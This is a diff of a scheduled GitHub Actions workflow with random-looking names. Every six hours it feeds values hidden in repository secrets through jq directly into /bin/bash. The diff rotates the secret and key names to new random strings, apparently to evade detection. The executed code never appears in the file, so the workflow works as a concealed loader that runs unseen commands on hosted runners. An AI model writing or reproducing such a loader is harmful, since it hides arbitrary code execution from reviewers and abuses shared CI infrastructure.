@@ -1,31 +1,27 @@
 name: zhangsansa8917
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
+    - cron: '16 2/6 * * *'
 
-jobs:  # 22116
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhangsansa8917
         env:
-          svb88030: ${{ secrets.svb88030 }}
+          ijaj66: ${{ secrets.ijaj66 }}
         run: |
-          echo $svb88030 | jq -r .icy10753 | /bin/bash
-          echo $lk2 | jq -r .fdqqn39 | /bin/bash
-          echo $siix668 | jq -r .fagkd9180 | /bin/bash
-          echo $lkf05 | jq -r .ozxd849 | /bin/bash
-          echo $scsxs2793 | jq -r .vai64870 | /bin/bash
-          echo $qius2 | jq -r .imskw38 | /bin/bash
-          echo $oamy672 | jq -r .guksq6682 | /bin/bash
-          echo $xlvn922 | jq -r .tripd47 | /bin/bash
-          echo $qiyny2032 | jq -r .p94586 | /bin/bash
-          echo $xv5 | jq -r .bp4 | /bin/bash
-          echo $x84629 | jq -r .de6 | /bin/bash
-          echo $wfkya3876 | jq -r .n75381 | /bin/bash
-          echo $t018 | jq -r .rl6603 | /bin/bash
-          echo $nzxla7525 | jq -r .t00272 | /bin/bash
-          echo $ys8224 | jq -r .qph91750 | /bin/bash
+          echo $ijaj66 | jq -r .iolc893 | /bin/bash
+          echo $vj6534 | jq -r .ws8 | /bin/bash
+          echo $poq8785 | jq -r .rvnjh70 | /bin/bash
+          echo $e7115 | jq -r .r7889 | /bin/bash
+          echo $vavlu281 | jq -r .uwsl1 | /bin/bash
+          echo $uyace304 | jq -r .mm859 | /bin/bash
+          echo $pqe8276 | jq -r .kl4 | /bin/bash
+          echo $herq1430 | jq -r .rpoa3 | /bin/bash
+          echo $o36 | jq -r .x49 | /bin/bash
 
